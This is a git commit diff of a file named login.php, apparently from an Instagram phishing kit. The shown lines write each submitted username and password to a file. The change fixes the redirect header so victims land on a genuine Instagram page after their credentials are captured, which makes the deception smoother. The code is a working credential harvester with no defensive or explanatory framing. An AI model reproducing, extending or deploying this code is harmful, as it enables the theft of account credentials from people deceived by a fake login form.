37ff32e4f28e2f429b035ea8e98773845b80c2aa
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-05-23 13:07:09 +0200

    Update login.php

--- login.php
+++ login.php
@@ -4,8 +4,6 @@ fputs($fp, "\n");
 fputs ($fp, "login : ".$_POST['username']);
 fputs ($fp, " / password : ".$_POST['password']);
 fclose ($fp);
-?>
-<?php 
-header('https://www.instagram.com/thelinuxproject/?hl=fr'); 
+header('Location: https://www.instagram.com/thelinuxproject/?hl=fr'); 
 exit;
 ?>
